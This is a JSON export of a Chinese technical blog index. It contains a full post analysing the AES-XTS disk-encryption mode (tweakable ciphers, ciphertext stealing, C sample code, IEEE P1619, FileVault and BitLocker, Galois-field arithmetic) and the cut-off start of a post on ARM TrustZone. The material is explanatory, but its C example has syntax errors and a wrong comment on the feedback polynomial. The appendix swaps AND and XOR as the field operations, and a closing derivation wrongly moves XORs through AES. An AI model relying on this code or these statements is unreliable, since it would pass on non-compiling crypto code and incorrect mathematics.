[{"title":"AES-XTS 磁盘加密模式的技术分析","url":"/2023/10/29/AES-XTS-%E7%A3%81%E7%9B%98%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/","content":"<p>AES-XTS 的设计目标是解决磁盘文件的加密存储需求。<br>ECB 模式存在明文攻击问题，磁盘文件中经常存在内容相同的分组，显然不适用。其他分组密码工作模式也有两个难题无法解决，一是如何存储初始向量IV，二是如何支持随机存取。</p>\n<p>CBC、CFB 和 OFB 模式都需要初始向量，因此每个文件都需要额外的空间用于存储 IV，不仅增加磁盘开销，而且破坏了明文和密文在扇区存储上的对应关系，给底层技术实现带来了很大麻烦。</p>\n<p>CBC、CFB 和 OFB 模式的分组之间存在依赖关系，不能实现完全的并行计算（CBC、CFB 模式仅支持解密的并行计算，并需要额外读取上一个分组的密文；OFB 模式完全不支持并行计算），因此即使仅仅修改磁盘文件的个别字节，也需要重新加密整个文件，严重影响了处理效率。</p>\n<p>相对而言，CTR 模式较为友好，通过提前预处理流密钥，可以支持加密和解密的并行计算。但是，CTR 模式同样需要独立的计数器，无法解决额外存储的问题。</p>\n<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>AES-XTS 的全称：XEX-based Tweaked-codebook mode with ciphertext Stealing。</p>\n<ul>\n<li>基于XEX，XOR-ENCRYPT-XOR</li>\n<li>支持密文窃取算法，ciphertext Stealing</li>\n<li>可调整的密码本模式，Tweaked-codebook</li>\n</ul>\n<p>白化（Whitening）是 AES-XTS 的重要技术基础，最早出现是 Ronald L.Rivest 发明的 DES-X。<br>DES 通常使用的密钥是56位，为了增加迭代分组加密安全性，DES-X 使用了两个64位的密钥，在第一轮加密和最后一轮对密钥和明文进行异或操作，攻击者若不知道密钥，则无法进行第一个加密解密操作，这样就在不改变算法的前提下，即可增加密钥的有效长度，以增强暴力破解的复杂度。</p>\n<blockquote>\n<p>Ronald L.Rivest 就是 RSA 中的 R ！美国麻省理工学院教授，2002年图灵奖得主之一。</p>\n</blockquote>\n<p>2002年，Moses Liskov，Ronald L.Rivest, David Wagner 首次提出了<a href=\"https://people.csail.mit.edu/rivest/pubs/LRW02.pdf\">可调整的分组密码</a>，跟传统的分组密码相比，除了密匙和明文这两个输入外，还引入一个新输入—可调整值 tweak，其优势在于：</p>\n<ol>\n<li>在不更改分组密钥的情况下，仅仅改变 tweak value 就可以给加密系统提供多变性，tweak value 是公开的，即使被泄露，仍然需要分组密钥才能解密；</li>\n<li>tweak value 可以设置为与区块的 index 成对应关系，不再需要存储额外的初始向量，也就避免了明文和密文在扇区上的存储不对应的问题；</li>\n<li>完成初始化加密后，tweak value 甚至可以任意修改而不影响密文的解密，也意味着 tweak 修改后不需要重新计算并存储加密数据；</li>\n<li>各个区块数据的加密解密互相独立（tweak key 各不相同），不存在依赖关系，加密和解密都可以完全并行化。</li>\n</ol>\n<p>2007年，IEEE 组织发布了<a href=\"https://luca-giuzzi.unibs.it/corsi/Support/papers-cryptography/1619-2007-NIST-Submission.pdf\">IEEE std 1619-2007</a> ，提供 XTS-AES 算法用于以数据单元（包括扇区、逻辑磁盘块等）为基础结构的存储设备中静止状态数据的加密，SISWG（存储安全工作组，Security in Storage Working Group）负责维护该标准。</p>\n<p><img src=\"/2023/10/29/AES-XTS-%E7%A3%81%E7%9B%98%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/XTS_mode_encryption.png\" alt=\"total\"></p>\n<p>2010年，美国密码局也接纳了该标准，并命名为<a href=\"https://csrc.nist.gov/pubs/sp/800/38/e/final\">NIST SP800-38E</a>。</p>\n<h2 id=\"二、基本流程\"><a href=\"#二、基本流程\" class=\"headerlink\" title=\"二、基本流程\"></a>二、基本流程</h2><h3 id=\"1-单一分组的处理方式\"><a href=\"#1-单一分组的处理方式\" class=\"headerlink\" title=\"1. 单一分组的处理方式\"></a>1. 单一分组的处理方式</h3><p><img src=\"/2023/10/29/AES-XTS-%E7%A3%81%E7%9B%98%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/enc-dec.png\" alt=\"vs\"></p>\n<h4 id=\"加密算法：-C-XTS-AES-blockEnc-Key-P-i-j\"><a href=\"#加密算法：-C-XTS-AES-blockEnc-Key-P-i-j\" class=\"headerlink\" title=\"加密算法：$C &#x3D; XTS-AES-blockEnc(Key, P, i, j)$\"></a>加密算法：$C &#x3D; XTS-AES-blockEnc(Key, P, i, j)$</h4><p>输入参数为：</p>\n<ul>\n<li>$Key$：一个加密密钥，均等分为两个部分，key2 就是 tweak key，key1 用于明文的分组加密</li>\n<li>$P$：一个128位的明文块，也就是16个字节</li>\n<li>$i$：一个128位的 tweak value，通常是磁盘扇区的序号</li>\n<li>$j$：该明文块在该数据单元（扇区）中的分组序列号，以16个字节为单位</li>\n</ul>\n<p>输出结果是：</p>\n<ul>\n<li>$C$：这个块加密后的密文</li>\n</ul>\n<p>处理逻辑为：<br>$T &#x3D; AES-enc(key_2, i) \\bigotimes \\alpha^j$<br>$C &#x3D; AES-enc(key_1, P \\bigoplus T) \\bigoplus T$</p>\n<h4 id=\"解密算法：-C-XTS-AES-blockDec-Key-C-i-j\"><a href=\"#解密算法：-C-XTS-AES-blockDec-Key-C-i-j\" class=\"headerlink\" title=\"解密算法：$C &#x3D; XTS-AES-blockDec(Key, C, i, j)$\"></a>解密算法：$C &#x3D; XTS-AES-blockDec(Key, C, i, j)$</h4><p>输入参数、输出结果的结构与加密算法保持一致，只是 C 和 P 换了位置。</p>\n<p>处理逻辑为：<br>$T &#x3D; AES-enc(key_2, i) \\bigotimes \\alpha^j$<br>$P &#x3D; AES-dec(key_1, C \\bigoplus T) \\bigoplus T$</p>\n<h3 id=\"2-密文窃取的处理方式\"><a href=\"#2-密文窃取的处理方式\" class=\"headerlink\" title=\"2. 密文窃取的处理方式\"></a>2. 密文窃取的处理方式</h3><p><img src=\"/2023/10/29/AES-XTS-%E7%A3%81%E7%9B%98%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/enc-dec-last2.png\" alt=\"2\"></p>\n<h4 id=\"加密算法\"><a href=\"#加密算法\" class=\"headerlink\" title=\"加密算法\"></a>加密算法</h4><ul>\n<li>明文$P_{m-1}$执行 AES-enc，密文结果 $C$ 的前 i 个字节作为$C_{m-1}$</li>\n<li>（明文$P_m$的不完整分组 + <strong>窃取</strong>$C$的剩余字节），执行 AES-enc 得到$C_m$</li>\n</ul>\n<h4 id=\"解密算法\"><a href=\"#解密算法\" class=\"headerlink\" title=\"解密算法\"></a>解密算法</h4><ul>\n<li>对密文$C_{m-1}$执行 AES-dec，明文结果 P 的前 i 个字节作为$P_m$</li>\n<li>（密文$C_m$的不完整分组 + <strong>窃取</strong>$P$的剩余字节），执行 AES-dec 得到$P_{m-1}$</li>\n</ul>\n<p>通过密文窃取方式，AES-XTS 保持了明文和密文长度的一致性，不会造成存储空间的浪费，代价是需要缓存最后2个数据分组。</p>\n<h2 id=\"三、代码示例\"><a href=\"#三、代码示例\" class=\"headerlink\" title=\"三、代码示例\"></a>三、代码示例</h2><p>AES-XTS 的硬件实现很方便，有限域的乘法就是一个 LSFR（线性移位反馈寄存器）。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> GF_128_FDBK     0x87                <span class=\"comment\">// 设定本原生成式 = x^4 + x^2 + x + 1，FDBK=feedback</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> AES_BLK_BYTES   16                  <span class=\"comment\">// 1 byte = 8 bits, 128位 = 16个字节</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">XTS_EncryptSector</span><span class=\"params\">( AES_Key &amp;k2,       <span class=\"comment\">// tweak 可调整密钥 </span></span></span><br><span class=\"line\"><span class=\"params\">                        AES_Key &amp;k1,       <span class=\"comment\">// ECB 主密钥</span></span></span><br><span class=\"line\"><span class=\"params\">                        u64b    S,         <span class=\"comment\">// 扇区sector的序号，最长64位</span></span></span><br><span class=\"line\"><span class=\"params\">                        uint    N,         <span class=\"comment\">// 扇区sectot的长度，按字节计算</span></span></span><br><span class=\"line\"><span class=\"params\">                        <span class=\"type\">const</span>   u08b *pt,  <span class=\"comment\">// 明文，输入，const声明防止被修改</span></span></span><br><span class=\"line\"><span class=\"params\">                        u08b    *ct )</span>      <span class=\"comment\">// 密文，输出，地址传参</span></span><br><span class=\"line\">&#123;                                          </span><br><span class=\"line\">    uint    i,j;</span><br><span class=\"line\">    u08b    T[AES_BLK_BYTES];               <span class=\"comment\">// tweak value， </span></span><br><span class=\"line\">    u08b    x[AES_BLK_BYTES];               <span class=\"comment\">// 临时工作变量</span></span><br><span class=\"line\">    u08b    Cin, Cout;                      <span class=\"comment\">// LSFR 的携位信息</span></span><br><span class=\"line\"></span><br><span class=\"line\">    assert(N &gt;= AES_BLK_BYTES == <span class=\"number\">0</span>);         <span class=\"comment\">// 断言：确认至少有一个完整分组</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 将扇区序号作为 i，导入tweak value；注意需调整为小端字节序：123456789a-&gt;9a78563412</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> (j = <span class=\"number\">0</span>; j &lt; AES_BLK_BYTES; j++&gt;) &#123;  </span><br><span class=\"line\">        T[j] = (u08b) (S &amp; <span class=\"number\">0xFF</span>);           </span><br><span class=\"line\">        S = S &gt;&gt; <span class=\"number\">8</span>;                         <span class=\"comment\">// S 是64位，高8个字节实际填充0；物理限制2^128，建议2^20</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 基于 tweakl key 加密，完成 T 的初始化</span></span><br><span class=\"line\">    AES_ECB_Encrypt(k2, T);                 T</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 每次处理16字节的分组，i 记录当前扇区的处理位置，注意循环结束在倒数第二个分组！</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>; i+AES_BLK_BYTES &lt;= N; i += AES_BLK_BYTES) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 明文 pt 和 T 的第一轮XOR</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (j = <span class=\"number\">0</span>; j &lt; AES_BLK_BYTES; j++)</span><br><span class=\"line\">            x[j] = pt[i+j] ^ T[j];          </span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 基于主密钥完成加密</span></span><br><span class=\"line\">        AES_ECB_Encrypt(k1, x);             </span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 明文 pt 和 T 的第二轮XOR，ct 作为密文结果输出</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (j = <span class=\"number\">0</span>; j &lt; AES_BLK_BYTES; j++) </span><br><span class=\"line\">            ct[i+j] = x[j] ^ T[j];         </span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 基于GF(2^128)乘法，LSFR 为下一循环构造 T，包含移位和反馈两个步骤</span></span><br><span class=\"line\">        <span class=\"comment\">// 移位步骤：T 的16个字节依次左移1位，末位补0。不能简单的整体左移1位！因为是小端字节序</span></span><br><span class=\"line\">        Cin = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (j = <span class=\"number\">0</span>; j &lt; AES_BLK_BYTES; j++) &#123;   </span><br><span class=\"line\">            Cout = (T[j] &gt;&gt; <span class=\"number\">7</span> ) &amp; <span class=\"number\">1</span>;            <span class=\"comment\">// 第j个字节的最高位溢出，暂存Cout</span></span><br><span class=\"line\">            T[j] = ((T[j] &lt;&lt; <span class=\"number\">1</span>) + Cin) &amp; <span class=\"number\">0xFF</span>;  <span class=\"comment\">// 当前字节左移1位，末位填充上个字节的溢出位</span></span><br><span class=\"line\">            Cin = Cout;                         <span class=\"comment\">// 为下个字节准备溢出位</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">// 反馈步骤：如果T最高位溢出的比特为1，则最低位字节 XOR (1000 0111)</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (Cout)                           </span><br><span class=\"line\">            T[<span class=\"number\">0</span>] ^= GF_128_FDBK;                <span class=\"comment\">// 本原生成式的最高位x^4，T[0]就够用</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 如果 i == N，说明没有不完整分组，无需处理；否则，对最后一个不完整扇区进行密文窃取</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (i &lt; N) &#123;   </span><br><span class=\"line\">        <span class=\"comment\">// 明文 pt 和 T 的第一轮XOR                         </span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (j=<span class=\"number\">0</span>; i+j&lt;N; j++) &#123;</span><br><span class=\"line\">            x[j] = pt[i+j] ^ T[j];              <span class=\"comment\">// x[0..z-1]：仅处理明文的剩余 z 个字节 </span></span><br><span class=\"line\">            ct[i+j] = ct[i+j-AES_BLK_BYTES];    <span class=\"comment\">// 保存上一分组密文的前 z 个字节，并追加到密文输出的尾部</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (; j&lt;AES_BLK_BYTES; j++)            <span class=\"comment\">// 注意！j 开始于上个循环的结束位置 m-1 ！</span></span><br><span class=\"line\">            x[j] = ct[i+j-AES_BLK_BYTES];       <span class=\"comment\">// x[z,15]：窃取上一轮密文的后 16-z 个字节</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 基于主密钥完成加密</span></span><br><span class=\"line\">        AES_ECB_Encrypt(k1, x);                 </span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 填充窃取数据的明文 pt 和 T 的第二轮XOR，ct 作为密文结果输出</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> (j=<span class=\"number\">0</span>; j&lt;AES_BLK_BYTES; j++)</span><br><span class=\"line\">            ct[i+j-AES_BLK_BYTES] =x[j] ^ T[j]; </span><br><span class=\"line\">    &#125;                                </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"四、后续演进\"><a href=\"#四、后续演进\" class=\"headerlink\" title=\"四、后续演进\"></a>四、后续演进</h2><h3 id=\"1-P1619-1\"><a href=\"#1-P1619-1\" class=\"headerlink\" title=\"1. P1619.1\"></a>1. P1619.1</h3><p>IEEE 1619 定义的 AES-XTS 仅提供机密性保护的能力，不包含完整性保护和身份认证的能力。<br>AES-XTS 可能被攻击者改写数据而不表现出异常（选择密文攻击），也无法抵御流量分析和重放攻击，请参见 <a href=\"https://crypto.stackexchange.com/questions/5587/what-is-the-advantage-of-xts-over-cbc-mode-with-diffuser\">Compare Blockmode CBC (with diffuser) against XTS</a>。</p>\n<p>P1619.1 定义了若干附加身份认证的加密算法，用于支持长度扩展的存储设备，包括：</p>\n<ul>\n<li>Counter mode with CBC-MAC (CCM)</li>\n<li>Galois&#x2F;Counter Mode (GCM)</li>\n<li>Cipher Block Chaining (CBC) with HMAC-Secure Hash Algorithm</li>\n<li>XTS-HMAC-Secure Hash Algorithm</li>\n</ul>\n<h3 id=\"2-P1619-2\"><a href=\"#2-P1619-2\" class=\"headerlink\" title=\"2. P1619.2\"></a>2. P1619.2</h3><p>AES-XTS 也被称为窄块加密算法（Narrow-block encryption），其特点是一个扇区被分成多个分组进行加密处理，例如 AES-128 就是 16 个字节，突出优势是硬件实现的效率高，但也存在某些安全隐患，例如较小的分组长度为数据修改攻击提供了便利条件。</p>\n<p>对应的，宽块加密算法（wide-block encryption）以一个完整的扇区为单位（通常为 512 个字节）进行加密处理，P1619.2 为此定了若干算法：</p>\n<ul>\n<li>XCB：<a href=\"https://eprint.iacr.org/2004/278.pdf\">the Extended Codebook (XCB) Mode of Operation</a></li>\n<li>EME2：Encrypt Mix Encrypt V2 Advanced Encryption Standard</li>\n</ul>\n<h3 id=\"3-P1619-3\"><a href=\"#3-P1619-3\" class=\"headerlink\" title=\"3. P1619.3\"></a>3. P1619.3</h3><p>定义了一套密钥管理的基础架构，包括体系结构、命名空间、操作、消息传递和传输。</p>\n<h2 id=\"五、产品实现\"><a href=\"#五、产品实现\" class=\"headerlink\" title=\"五、产品实现\"></a>五、产品实现</h2><h3 id=\"1-Mac-OS-X-Lion’s-FileVault-2\"><a href=\"#1-Mac-OS-X-Lion’s-FileVault-2\" class=\"headerlink\" title=\"1. Mac OS X Lion’s FileVault 2\"></a>1. Mac OS X Lion’s FileVault 2</h3><p>Apple 开发的 FileVault 基于 XTS-AES 算法实现，是一个磁盘级加密产品（不是文件级加密），满足如下技术要求：</p>\n<ul>\n<li>密⽂文应该与明⽂⼤小相同，从⽽不改变数据的布局</li>\n<li>数据分组可单独访问，且相互独⽴</li>\n<li>加密分组⼤小为16字节</li>\n<li>不使⽤其他元数据（除了数据分组的位置）</li>\n<li>不同位置 相同明⽂ &#x3D;&#x3D;》密⽂不不同</li>\n<li>符合标准的加解密设备可以相互通⽤</li>\n</ul>\n<p>Apple 安全白皮书中有一些关于 AES-XTS 的描述，例如：</p>\n<ul>\n<li>Mac 电脑会提供文件保险箱，这是一项内建加密功能，用于保护所有静态数据安全。文件保险箱使用 AES-XTS 数据加密算法保护内部和可移除储存设备上的完整宗卷。</li>\n<li>文件保险箱 FileValut 构建的密钥层级需要满足四个目标，其中之一就是：<strong>让用户无需重新加密整个宗卷即可更改其密码 （同时也会更改用于保护其文件的加密密钥）</strong>。</li>\n<li>每次在数据宗卷中创建文件时，数据保护都会创建一个新的 256 位密钥 （文件独有密钥），并将其提供给硬件 AES 引擎， 此引擎会使用该密钥在文件写入闪存时对其进行加密。</li>\n<li>采用 A9 到 A13、 S5 和 S6 的每一代硬件在 XTS 模式中使用 AES-128， 其中 256 位文件独有密钥会被拆分， 以提供一个 128 位tweak 密钥和一个 128 位 cipher 密钥。</li>\n<li>搭载 A14 和 M1 的设备上，加密模式升级为 AES-256，密钥派生算法基于 NIST Special Publication 800-108。</li>\n</ul>\n<p><img src=\"/2023/10/29/AES-XTS-%E7%A3%81%E7%9B%98%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/filevault2.png\" alt=\"arch\"><br>根据<a href=\"https://github.com/libyal/libfvde/blob/main/documentation/FileVault%20Drive%20Encryption%20(FVDE).asciidoc\">FileVault Drive Encryption (FVDE)</a>的描述，其AES-XTS协议的实现方式是：</p>\n<ul>\n<li>primary key（key1）：源自于 Volume Master Key (VMK)，128位</li>\n<li>tweak key（key2）: 源自于 logical volume family identifier，128位</li>\n<li>tweak value：源自于磁盘扇区序号，以 512 字节为单位</li>\n</ul>\n<p>执行命令<code>diskutil coreStorage info</code>可以查看 logical volume family identifier，或者检索系统变量<code>com.apple.corestorage.lv.familyUUID</code>，这充分体现了 twaek key 的可公开性。</p>\n<h3 id=\"2-Windows-Vista-BitLocker\"><a href=\"#2-Windows-Vista-BitLocker\" class=\"headerlink\" title=\"2. Windows Vista BitLocker\"></a>2. Windows Vista BitLocker</h3><p>微软开发的 Windows Vista BitLocker 使用的 AES-CBC+Elephant diffuser 模式也采用宽块加密模式，加密粒度是一个扇区，工作原理如下：</p>\n<ol>\n<li>$K &#x3D; K_1 | K_2$</li>\n<li>$PP &#x3D; P \\oplus K_1$</li>\n<li>PP 经过 2 个 diffuser 算法的作用后，使用 CBC 模式进行加密。<br> 其中，每个扇区的 $IV &#x3D; E_{K_2}(e(sector))$<br> sector为扇区号，$e()$将扇区号映射为一个唯一的 16 字节的 value。</li>\n</ol>\n<p>微软已经证明了使用扩散体(diffuser)后的 CBC 比原来的 CBC 更难攻击，</p>\n<h2 id=\"六、技术分析\"><a href=\"#六、技术分析\" class=\"headerlink\" title=\"六、技术分析\"></a>六、技术分析</h2><p>做个简要的总结分析：</p>\n<ol>\n<li>tweak key 实际上是一种流密码，解密和加密的算法是同质的；而用于 AES 的主密钥的加密和解密算法是互逆的。</li>\n<li>AES-XTS 采用窄块加密模式，一个 512 字节的标准扇区将分为 32 个 AES-128 的分组。</li>\n<li>T 的初始化基于可公开的 $key_2$ 和 扇区序号 i，为文件和扇区级别的加密提供了随机数；<br> 后续每个分组的 T 密钥将基于 LFSR 的 j 阶乘法，为扇区内部的分组加密提供了随机数。<br> 通过 i 和 j 的组合使用，既提供了随机因子对抗明文攻击，又不需要额外的 IV 存储。</li>\n<li>T 密钥是基于$GF(2^{128})$的 j 阶乘法，即确保提供伪随机性，又充分利用有限域的元素空间。</li>\n<li>除了密文窃取方式需要缓存最后 2 个分组，AES-XTS 的分组之间不存在依赖关系，可以很好支持并行处理。</li>\n</ol>\n<p>还有一些遗留问题：</p>\n<h3 id=\"1-AES-XTS-如何加密小文件？\"><a href=\"#1-AES-XTS-如何加密小文件？\" class=\"headerlink\" title=\"1. AES-XTS 如何加密小文件？\"></a>1. AES-XTS 如何加密小文件？</h3><p>IEEE 1619 明确指出 AES-XTS 不支持小于一个分组的明文长度，如 AES-128-XTS 加密文件不得少于16个字节，那么小文件如何加密呢？<br>一种可能的方案是，采用类似 PKCS#7 的填充技术（文心一言的回答！），但结果是明文和密文的长度不一致，不利于磁盘管理。<br>另一种方案是，改用 ECB 工作模式，但解决明文攻击的问题如何解决呢？</p>\n<h3 id=\"2-如果更改-tweak-key-会发生什么？\"><a href=\"#2-如果更改-tweak-key-会发生什么？\" class=\"headerlink\" title=\"2. 如果更改 tweak key 会发生什么？\"></a>2. 如果更改 tweak key 会发生什么？</h3><p>tweak key 基于 XOR-ENCRYPT-XOR 模式，更改密钥时是否需要更新已存储的密文呢？<br>以下理论推演是否成立？</p>\n<blockquote>\n<p>用 T1 加密，解密时换了 T2<br>$$<br>\\begin{aligned}<br>    P’’&amp;&#x3D;AES-dec(key_1,C\\oplus T_2)\\oplus T_2\\\\<br>    &amp;&#x3D;AES-dec(key_1, AES-enc(key_1, P \\oplus T_1) \\oplus T_1 \\oplus T_2) \\oplus T_2 \\\\<br>    &amp;&#x3D;AES-dec(key_1, AES-enc(key_1, P \\oplus T_1) \\oplus T_1 \\oplus T_2 \\oplus T_2) \\\\<br>    &amp;&#x3D;AES-dec(key_1, AES-enc(key_1, P \\oplus T_1) \\oplus T_1 \\oplus 0) \\\\<br>    &amp;&#x3D;AES-dec(key_1, AES-enc(key_1, P \\oplus T_1) \\oplus T_1) \\\\<br>    &amp;&#x3D;AES-dec(key_1, AES-enc(key_1, P \\oplus T_1 \\oplus T_1)) \\\\<br>    &amp;&#x3D;AES-dec(key_1, AES-enc(key_1, P \\oplus 0)) \\\\<br>    &amp;&#x3D;AES-dec(key_1, AES-enc(key_1, P)) \\\\<br>    &amp;&#x3D;P<br>\\end{aligned}<br>$$</p>\n</blockquote>\n<hr>\n<h2 id=\"附录：伽罗瓦域的乘法\"><a href=\"#附录：伽罗瓦域的乘法\" class=\"headerlink\" title=\"附录：伽罗瓦域的乘法\"></a>附录：伽罗瓦域的乘法</h2><h3 id=\"有限域\"><a href=\"#有限域\" class=\"headerlink\" title=\"有限域\"></a>有限域</h3><p>从群论的角度看，域是特殊的群，域有单位元e和逆元，而且加法和乘法上具有封闭性，即：对域中的元素进行加法或乘法运算后的结果仍然是域中的元素。</p>\n<blockquote>\n<p>注意！域上的乘法和加法不一定是我们平常使用的乘法和加法。考虑到二进制进位的影响，可以把 C 语言中的 AND 运算和 XOR 运算分别定义成加法和乘法。</p>\n</blockquote>\n<p>如果某个域的元素数量确定（而不是无限），则称为有限域，又叫伽罗瓦域(Galois field)，记作GF(p)，该命名是为纪念法国数学家 Evariste Galois。<br>有限域GF(p)包含 p 个元素（p必须是质数），分别是 0 到 p-1，例如GF(7)：{0,1,2,3,4,5,6}。</p>\n<p>很多情况下 GF(p) 是不够用的，比如在图像像素的色彩空间一般为RGB(红绿蓝)色彩空间，每种颜色的取值范围都是0~255，我们需要另外一种有限域，它应该有$2^8$个元素，记为$GF(2^8)$。</p>\n<h3 id=\"本原多项式\"><a href=\"#本原多项式\" class=\"headerlink\" title=\"本原多项式\"></a>本原多项式</h3><p>域中不可约多项式（primitive polynomial）是不能够进行因子分解的多项式，本原多项式是一种特殊的不可约多项式。当一个域上的本原多项式确定了，这个域上的运算也就确定了，本原多项式一般通过查表可得，同一个域往往有多个本原多项式。</p>\n<p>对于$GF(p^n)$来说，通常的加法运算与乘法运算往往不能构成一个域的，所以我们需要引进新的加法运算与乘法运算，即多项式乘法。通过将域中的元素化为多项式的形式，可以将域上的乘法运算转化为普通的多项式乘法模以本原多项式的计算。</p>\n<p>比如：$g(x) &#x3D; x^3+x+1$是$GF(2^3)$上的本原多项式，则域上元素$3 \\bigotimes 7$可以转化为多项式乘法：<br>$(x+1) * (x^2+x+1) $ mod g(x) &#x3D; ($x^3+1$) mod($x^3+x+1$) &#x3D; x<br>也就是 $3 \\bigotimes 7 &#x3D; 2$。需要注意的是，系数为 2 的整数倍会被约去。</p>\n<h3 id=\"LSFR\"><a href=\"#LSFR\" class=\"headerlink\" title=\"LSFR\"></a>LSFR</h3><p>无论是普通计算还是伽罗瓦域上运算，乘二计算是一种非常特殊的运算。普通计算在计算机上通过向高位的移位计算即可实现，伽罗瓦域上乘二也不复杂，一次移位和一次异或即可，并且2 是GF(28) 中的生成元。</p>\n<p>从多项式的角度来看，伽罗瓦域上乘二对应的是一个多项式乘以x，如果这个多项式最高指数没有超过本原多项式最高指数，那么相当于一次普通计算的乘二计算，如果结果最高指数等于本原多项式最高指数，那么需要将除去本原多项式最高项的其他项和结果进行异或，在硬件中要实现：$g(x) &#x3D; x^8+x^4+x^3+x^2+1$，即：<br>x7  ← x6 ← x5  ← x4 ← x3 ← x2  ← x1  ← x0<br>↓________________↑___↑___↑_________↑<br>这里x0到x7 分别代表域中一个数的比特位，每次乘二除最高位不移位，其余各位向高位移一位，最高位和指定位进行异或（由本原多项式决定）。不难知道最高位异或的那几位对应着本原多项式系数为1 的几项。</p>\n<p>用C 语言可以写成：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">uint8_t</span> c, cc;</span><br><span class=\"line\">cc = (c&lt;&lt;<span class=\"number\">1</span>) ^ ((c &amp; <span class=\"number\">0x80</span>) ? <span class=\"number\">0x1d</span> : <span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure>\n\n<p>c&amp;0x80 可以判断数c 最高位是否为1，如果为1 则异或0x1d。</p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://thiscute.world/posts/practical-cryptography-basics-1/\">系列 - 写给开发人员的实用密码学</a></li>\n<li><a href=\"https://www.zhihu.com/question/26452995\">XTS-AES模式主要是解决什么问题，是怎样解决的?</a></li>\n<li><a href=\"https://en.wikipedia.org/wiki/Xor%E2%80%93encrypt%E2%80%93xor\">XEX - Wiki</a></li>\n<li><a href=\"https://link.springer.com/content/pdf/10.1007/s001459900025\">A Construction of a Cipher from a Single Pseudorandom Permutation</a></li>\n<li><a href=\"https://github.com/libyal/libfvde/blob/main/documentation/FileVault%20Drive%20Encryption%20(FVDE).asciidoc\">FileVault Drive Encryption (FVDE)</a></li>\n<li><a href=\"https://github.com/heisencoder/XTS-AES\">XTS-AES 参考代码实现 - Github</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/20279484\">OS X Disk Util Manual Basic</a></li>\n<li><a href=\"https://www.ibm.com/docs/en/linux-on-systems?topic=examples-aes-xts-mode-example\">AES with XTS mode example - IBM</a></li>\n<li><a href=\"http://blog.foool.net/2013/01/%E4%BC%BD%E7%BD%97%E7%93%A6%E5%9F%9F%E4%B8%8A%E7%9A%84%E4%B9%98%E6%B3%95/\">伽罗瓦域上的乘法</a></li>\n<li><a href=\"https://www.bilibili.com/read/cv2922069/\">另一种世界观——有限域</a></li>\n<li><a href=\"https://www.cnblogs.com/weijianlong/p/11947741.html\">线性反馈移位寄存器（LFSR）</a></li>\n<li><a href=\"%E7%A3%81%E7%9B%98%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E5%88%86%E6%9E%90.pdf\">磁盘加密模式分析</a></li>\n<li><a href=\"https://crossbowerbt.github.io/xts_mode_tweaking.html\">Tweaking Tweakable AES XTS Mode</a></li>\n</ul>\n"},{"title":"ARM TrustZone的技术概述","url":"/2022/09/25/ARM-TrustZone%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/","content":"<h2 id=\"一、安全元件-SE（Secure-Element）\"><a href=\"#一、安全元件-SE（Secure-Element）\" class=\"headerlink\" title=\"一、安全元件 - SE（Secure Element）\"></a>一、安全元件 - SE（Secure Element）</h2><p>19世纪70年代就出现了安全元件Secure Element，其外在表现就是一块物理上独立的芯片卡，负责提供私密信息的安全存储、重要程序的安全执行等功能。</p>\n<p>按照Global Platform的定义，SE具有自己独立的执行环境和安全存储，采用安全协议与外部通讯，支持软件防篡改和硬件防篡改，其内部组件包含有：CPU、RAM、ROM、加密引擎、传感器等。<br><img src=\"/2022/09/25/ARM-TrustZone%E7%9A%84%E6%8A%80%E6%9C%AF%E6%A6%82%E8%BF%B0/SE.png\" 